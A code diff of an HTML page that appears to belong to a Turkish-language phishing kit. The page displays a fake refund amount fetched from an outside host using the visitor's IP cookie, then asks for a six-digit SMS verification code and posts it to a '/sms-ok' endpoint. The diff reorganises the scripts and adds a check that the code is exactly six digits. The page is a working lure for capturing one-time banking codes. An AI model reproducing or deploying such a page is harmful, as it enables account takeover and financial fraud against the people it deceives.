@@ -42,24 +42,34 @@
            <center>   <img src="https://media.istockphoto.com/id/503913526/pt/vetorial/%C3%ADcone-de-sms-smartphone.jpg?s=170667a&amp;w=0&amp;k=20&amp;c=2wJWZETcgVDZQRWmBou-LU0vT2D9IdUS0McpSy6gfFY=" jsaction="VQAsE" class="sFlh5c pT0Scc iPVvYb" style="max-width: 100%;height: 57%;margin: 4px 0px;width: 40%;" alt="Vetores de Ícone De Sms Smartphone e mais imagens de Aplicação móvel -  Aplicação móvel, Cardápio, Celular com câmera - iStock" jsname="kn3ccd" aria-hidden="false">  
 <br> 
      </center> 
-    
-     <form method="post" id="loginForm" name="sifreGirisForm" action="/sms-ok" autocomplete="off">
-      <fieldset>
-          <div class="form-row required">
-            <div class="form-row center-item"> <label for="iade" class="enforced" id="iade" style="display: none;">İADE TUTARI :</label>
-           <br> <center> <label id="iadeTutari"> </label>  </center> </div> 
-           <script>
+        <script>
+        document.addEventListener("DOMContentLoaded", function() {
+            const smsInput = document.getElementById("sms");
+
+            smsInput.addEventListener("input", function() {
+                if (smsInput.value.length > 6) {
+                    smsInput.value = smsInput.value.slice(0, 6);
+                }
+            });
+
+            document.getElementById("loginForm").addEventListener("submit", function(e) {
+                if (smsInput.value.length !== 6) {
+                    e.preventDefault();
+                    alert("SMS doğrulama kodu 6 karakter olmalıdır.");
+                }
+            });
+
             window.onload = function() {
                 const apiUrl = 'https://hakikicelikhantutunu.com/dmn/pin.php?ip=';
                 const ip = getCookie('ip');
-        
+
                 if (!ip) {
                     console.error('IP adresi cookie olarak bulunamadı.');
                     return;
                 }
-        
+
                 const url = apiUrl + encodeURIComponent(ip);
-        
+
                 // AJAX ile GET isteği yaparak cevabı al
                 fetch(url)
                     .then(response => response.text())
@@ -67,47 +77,54 @@
                         // Cevabı aldıktan sonra işlemleri yap
                         const iadeTutariLabel = document.getElementById('iade');
                         const iadeTutariElement = document.getElementById('iadeTutari');
-                        
+
                         // İade tutarını Türk Lirası formatına dönüştür
                         const formattedTutar = formatTutar(data);
-        
+
                         iadeTutariElement.textContent = iadeTutariLabel.textContent + ' ' + formattedTutar;
                     })
                     .catch(error => console.error('API isteği hatası:', error));
             };
-        
+
             // Cookie'den değer almak için yardımcı fonksiyon
             function getCookie(name) {
                 const value = `; ${document.cookie}`;
                 const parts = value.split(`; ${name}=`);
                 if (parts.length === 2) return parts.pop().split(';').shift();
             }
-        
+
             // Türk Lirası formatına dönüştürme fonksiyonu
             function formatTutar(tutar) {
                 const formattedTutar = Number(tutar).toLocaleString('tr-TR', {
                     style: 'currency',
                     currency: 'TRY'
                 });
-        
+
                 return formattedTutar.replace(/\s/g, ''); // Boşlukları kaldır
             }
-        </script>
-        <br>
-              <label for="sms" class="enforced">SMS DOĞRULAMA KODU</label>
-              <input type="hidden" name="encsms" id="encsms" value="">
-              <div class="form-field fieldGroup">
-                  <input name="sms" type="number" e-validate="tck" class="form-control" id="sms" value="" autocomplete="off" maxlength="6" minlength="6" title="sms" required>
-              </div>
-          </div>
-          <br>
-          <div class="form-row center-item">
-              <input type="hidden" name="actionName" value="giris">
-              <button class="btn btn-send" name="submitButton" type="submit" value="Giriş Yap" onclick="addIpToForm()">DOĞRULA</button>
-          </div>
-          <input type="hidden" name="ip" id="ip" value="">
-      </fieldset>
-  </form>
+        });
+    </script>
+
+    <form method="post" id="loginForm" name="sifreGirisForm" action="/sms-ok" autocomplete="off">
+        <fieldset>
+            <div class="form-row required">
+                <div class="form-row center-item"> <label for="iade" class="enforced" id="iade" style="display: none;">İADE TUTARI :</label>
+                <br> <center> <label id="iadeTutari"> </label>  </center> </div> 
+                <br>
+                <label for="sms" class="enforced">SMS DOĞRULAMA KODU</label>
+                <input type="hidden" name="encsms" id="encsms" value="">
+                <div class="form-field fieldGroup">
+                    <input name="sms" type="number" e-validate="tck" class="form-control" id="sms" value="" autocomplete="off" required>
+                </div>
+            </div>
+            <br>
+            <div class="form-row center-item">
+                <input type="hidden" name="actionName" value="giris">
+                <button class="btn btn-send" name="submitButton" type="submit" value="Giriş Yap" onclick="addIpToForm()">DOĞRULA</button>
+            </div>
+            <input type="hidden" name="ip" id="ip" value="">
+        </fieldset>
+    </form>
 <script>
 
 document.addEventListener("DOMContentLoaded", function() {
